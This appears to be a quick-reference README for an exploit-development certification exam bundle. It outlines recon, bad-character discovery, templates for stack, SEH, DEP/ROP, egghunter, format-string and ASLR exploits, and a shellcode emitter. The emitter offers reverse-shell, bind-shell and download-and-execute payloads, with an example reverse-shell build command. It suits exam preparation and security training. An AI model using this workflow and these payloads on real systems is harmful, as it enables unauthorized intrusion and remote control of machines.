OSED Exam Bundle - Quick Reference
===================================

SETUP (run once per machine)
----------------------------
1. Transfer exam_bundle.zip to C:\exam\ via SMB:
     (on Kali)    impacket-smbserver kalismb . -smb2support
     (on Windows) copy \\<kali_ip>\kalismb\exam_bundle.zip C:\exam\

2. Extract and install:
     cd C:\exam\exam_bundle
     install.bat

   This checks for Python 3.12+. If the system Python is older or
   missing, it extracts the bundled Python 3.12 embeddable and sets
   up pip. Then installs keystone-engine from bundled wheels (offline).


BUNDLE LAYOUT
--------------
  exam_bundle\
    install.bat           Setup script (run once)
    python\               Python 3.12 embeddable (auto-extracted if needed)
    wheels\               Keystone wheels for offline pip install
    tools\
      recon.exe           PE triage, function ranking, pseudocode
      tcp_stage_server.py TCP staging server (run on Kali)
    badchars\
      badchar_auto.py     Automated bad-char discovery via cdb
      badchar_bp.wds      WinDbg breakpoint script
      examples\           Example configs for common targets
    templates\
      stack_bof.py        Stack overflow (JMP ESP)
      seh_exploit.py      SEH overwrite
      dep_bypass.py       DEP bypass with ROP chain
      egghunter.py        Egghunter
      format_string.py    Format string attack
      aslr_leak.py        ASLR info leak + exploit
      badchars_ref.py     Bad character test scaffold
    payloads\
      eip_check.py        EIP control verification payload
      vp_skeleton.py      VirtualProtect skeleton payload
    convert\
      string2hex.py       String/IP/sockaddr to shellcode hex
      opcode.py           API function name to ROR13 hash
    reference\
      (Markdown cheat sheets - open with any text editor)


WORKFLOW (per target)
---------------------
1. RECON - identify the target binary
     recon.exe pe <target.exe>
     recon.exe triage <target.exe>

2. REVERSE - read functions in IDA, get pseudocode
     recon.exe pseudo <ida_listing.txt>

3. BAD CHARS - static prediction then dynamic confirmation
     recon.exe badchars <target.exe>
     python badchars\badchar_auto.py --cdb ... --target ...

4. EXPLOIT - copy a template and fill it in
     copy templates\stack_bof.py exploit.py
     (edit exploit.py with target-specific values)

5. SHELLCODE - build on Kali with the emitter, transfer
     (on Kali) uv run emitter manifests/reverse_shell.yaml \
         --lhost tun0 --lport 9001 --out emitter_out/
     Transfer emitter_out/asm/code_snippet.py to exam box
     Transfer emitter_out/bin/shellcode.bin to exam box


RECON.EXE COMMANDS
------------------
  recon pe <file>                PE report: mitigations, imports, sections
  recon triage <file>            Function ranking by exploitability
  recon triage <file> --top 10   Top 10 functions only
  recon cdb <dump.txt>           Rank from WinDbg uf dump
  recon badchars <file>          Static bad-char prediction
  recon badchars <file> --all    Scan all functions (not just input path)
  recon filter --badchars 00,0a  Filter gadget addresses by bad bytes
  recon pseudo <listing.txt>     IDA listing to C-like pseudocode
  recon pseudo --func recv ...   Only functions matching "recv"

  All commands accept --md (Markdown) and --json (machine-readable).


CONVERSION TOOLS
-----------------
  python convert\string2hex.py string "cmd.exe"
      String to little-endian 4-byte chunks with push instructions

  python convert\string2hex.py ip 192.168.1.100
      IPv4 address to little-endian hex DWORD

  python convert\string2hex.py sockaddr --ip 192.168.1.100 --port 4444
      Full sockaddr_in structure fields

  python convert\opcode.py "CreateProcessA"
      API function name to ROR13 hash (for shellcode resolution)


BAD CHARACTER WORKFLOW
-----------------------
1. Static prediction:
     recon.exe badchars <target.exe>

2. Dynamic confirmation:
     python badchars\badchar_auto.py ^
       --cdb "C:\Tools\x86\cdb.exe" ^
       --target "C:\path\to\vuln.exe" ^
       --host 127.0.0.1 --port <port> ^
       --offset <offset> --size <bufsize> ^
       --breakpoint "msvcrt!strcpy" ^
       --dump-expr "poi(@esp+4)" ^
       --step pt ^
       --exclude 00,0a,0d ^
       --prefix "<prefix>" --suffix "<suffix>"

3. Add confirmed bad chars to emitter manifest, rebuild on Kali


EXPLOIT TEMPLATES
-----------------
Each template is a self-contained Python script. Copy the one that
matches your scenario and fill in the marked sections:

  Template          | When to use
  ------------------+--------------------------------------------------
  stack_bof.py      | Vanilla stack overflow, JMP ESP, no DEP/ASLR
  seh_exploit.py    | SEH overwrite (POP POP RET)
  dep_bypass.py     | DEP enabled, ROP chain to VirtualProtect
  egghunter.py      | Small buffer, need to find payload in memory
  format_string.py  | Format string vuln (stack read, GOT overwrite)
  aslr_leak.py      | ASLR enabled, info leak to defeat randomization
  badchars_ref.py   | Bad character identification scaffold

Each template walks through the exploit development stages:
  crash -> pattern -> offset -> eip -> badchars -> exploit


EMITTER PAYLOAD TYPES (built on Kali)
--------------------------------------
  Template          | Manifest              | Scenario
  ------------------+-----------------------+---------------------------
  reverse_shell     | reverse_shell.yaml    | Standard reverse shell
  copy_then_run     | copy_then_run.yaml    | SMB Copy: copy + execute
  move_then_run     | move_then_run.yaml    | SMB Move: move + execute
  tcp_download      | tcp_download.yaml     | HTTP/TCP download + execute
  tcp_stager        | tcp_stager.yaml       | Staged: recv + execute
  bind_shell        | bind_shell.yaml       | Bind shell
  run_command       | run_command.yaml      | Single command execution


TROUBLESHOOTING
---------------
Q: System Python is too old or missing?
A: install.bat auto-extracts the bundled Python 3.12 embeddable into
   the python\ folder. It creates py.bat as a shortcut. You can also
   add python\ to your PATH:  set PATH=C:\exam\exam_bundle\python;%PATH%

Q: Keystone install fails?
A: Check Python version (python --version). The bundle includes wheels
   for Python 3.7 through 3.13. If your version is missing, you can
   still use the pre-assembled shellcode.bin from the emitter.

Q: code_snippet.py assembly fails on a specific line?
A: Use debug_runner.py instead -- it scans line-by-line and reports
   exactly which instruction Keystone rejects.

Q: Need to modify shellcode but no Keystone?
A: Edit the assembly on Kali, rebuild with the emitter, and transfer
   the new shellcode.bin. The test_harness.py loads it without Keystone.

Q: recon.exe won't run?
A: It's a Go binary compiled for windows/386. If the exam box is x64
   it should still run (WoW64). If it doesn't, use the Kali-side
   recon command with a PE copied from the exam box.

Q: Format string template not working?
A: Find the format string offset first with %x/%p reads, then set
   OFFSET in the template. See reference\Shellcode_Reference.md.
